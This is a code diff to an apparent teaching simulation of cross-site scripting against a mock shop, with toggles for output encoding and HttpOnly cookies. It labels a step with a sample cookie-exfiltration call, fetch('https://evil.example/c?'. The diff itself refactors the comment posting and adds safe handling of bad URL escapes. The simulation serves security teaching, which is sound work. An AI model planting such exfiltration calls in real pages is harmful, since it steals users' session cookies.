@@ -1,11 +1,12 @@
 import { readChoice, refusal } from '../../algorithms/form';
 import type { Step } from '../../types/visualization';
-import { EMPTY, readBytes } from '../steps';
-import { USERS } from '../web/data';
+import { EMPTY, HANDLER_WAITING, readBytes, SCRIPT_NOT_UNDERSTOOD } from '../steps';
+import { MALLORY, USERS } from '../web/data';
 import { createEvil, EVIL_ORIGIN, evilStolen } from '../web/evil';
 import { findScripts } from '../web/html';
+import { createImages } from '../web/internal';
 import { loadInner, loadPage, type PageRun, type ScriptRun } from '../web/page';
-import { createShop, SAFE_SHOP, SHOP_ORIGIN } from '../web/shop';
+import { createShop, postComment, SAFE_SHOP, SHOP_ORIGIN } from '../web/shop';
 import { injectedScripts } from '../web/shop-pages';
 import { createStory, resultOf, type Story } from '../web/story';
 import { createWorld, type World } from '../web/world';
@@ -32,8 +33,6 @@ export const WHERE_OPTIONS = ['Reflected', 'Stored', 'DOM'];
 
 export const DEFENSE_OPTIONS = ['Off', 'On', 'HttpOnly only'];
 
-const MALLORY = { name: 'mallory', password: 'stored-xss', role: 'customer' };
-
 const LINES: Record<string, string> = { Reflected: "page = 'Results for '", Stored: 'page = comments.map', DOM: 'text = decodeURIComponent' };
 
 type Run = { world: World; story: Story; input: string };
@@ -46,20 +45,27 @@ function reflected({ world, input }: Run) {
 }
 
 function stored({ world, story, input }: Run) {
-  const signIn = world.send({ method: 'POST', url: `${SHOP_ORIGIN}/signin`, headers: {}, body: { name: MALLORY.name, password: MALLORY.password } }, 'attacker');
-  const cookie = `sid=${signIn.setCookies[0]!.value}`;
-  world.send({ method: 'POST', url: `${SHOP_ORIGIN}/comments`, headers: { cookie }, body: { body: input } }, 'attacker');
+  postComment(world, MALLORY, input);
   story.step({ title: 'mallory posts a comment', why: 'The shop saves the text as it is. It is only a row in a table for now, and it will reach everyone who opens the page.', next: 'alice opens the comments.', line: 'page = comments.map' });
   const run = loadPage(world, `${SHOP_ORIGIN}/comments`);
   return { html: visible(run), scripts: injectedScripts(run.scripts) };
 }
 
-function dom({ world, input }: Run, encoded: boolean) {
-  const run = loadInner(world, `${SHOP_ORIGIN}/welcome#${input}`, input);
-  return { html: encoded ? `(as text) ${input}` : input, scripts: run.scripts };
+/** A bad escape makes decodeURIComponent throw, so the page's own script stops and writes nothing. */
+function decodedFragment(input: string): string {
+  try {
+    return decodeURIComponent(input);
+  } catch {
+    return '';
+  }
 }
 
-const notUnderstood = 'This simulation does not understand this script. It runs no real code, so it can\'t say what it would do. A browser would try to run it.';
+function dom({ world, input }: Run, encoded: boolean) {
+  const text = decodedFragment(input);
+  const run = loadInner(world, `${SHOP_ORIGIN}/welcome#${input}`, text);
+  if (!text) return { html: "(nothing: the page's script could not decode this)", scripts: [] };
+  return { html: encoded ? `(as text) ${text}` : text, scripts: run.scripts };
+}
 
 function reportScript(story: Story, script: ScriptRun, emptyCookie: boolean) {
   const heading: Record<ScriptRun['status'], string> = {
@@ -71,8 +77,8 @@ function reportScript(story: Story, script: ScriptRun, emptyCookie: boolean) {
   };
   let why = script.actions.join(' ');
   if (script.status === 'ran') why = `It did this: ${why}. The browser can't tell it from the shop's own code, so it can do anything the page can.`;
-  if (script.status === 'not understood') why = notUnderstood;
-  if (script.status === 'waits for a click') why = 'This simulation only fires onerror on an image and onload on svg or body. Other handlers wait for their event, and a real browser fires some with no click.';
+  if (script.status === 'not understood') why = SCRIPT_NOT_UNDERSTOOD;
+  if (script.status === 'waits for a click') why = HANDLER_WAITING;
   if (emptyCookie) why += ' The sid cookie is HttpOnly, so document.cookie gave empty text. That saved the cookie, but the script still ran.';
   story.step({ title: heading[script.status], why, line: "fetch('https://evil.example/c?'", text: { label: 'Script', lines: { Source: script.source } } });
 }
@@ -100,7 +106,7 @@ export function crossSiteScriptingSteps(values: Record<string, string>): Step[] 
   const encoded = defense.value === 'On';
   const httpOnly = defense.value === 'HttpOnly only';
   const site = createShop({ users: [...SAFE_SHOP.users, MALLORY], encode: encoded, csp: 'none', cookie: { ...SAFE_SHOP.cookie, httpOnly } });
-  const world = createWorld([site, createEvil()]);
+  const world = createWorld([site, createEvil(), createImages()]);
   const story = createStory({ world, code: crossSiteScriptingCode, nodes: ['browser', 'attacker', 'shop', 'evil'] });
   const alice = USERS[0];
   world.browser.submit(`${SHOP_ORIGIN}/signin`, { name: alice.name, password: alice.password });
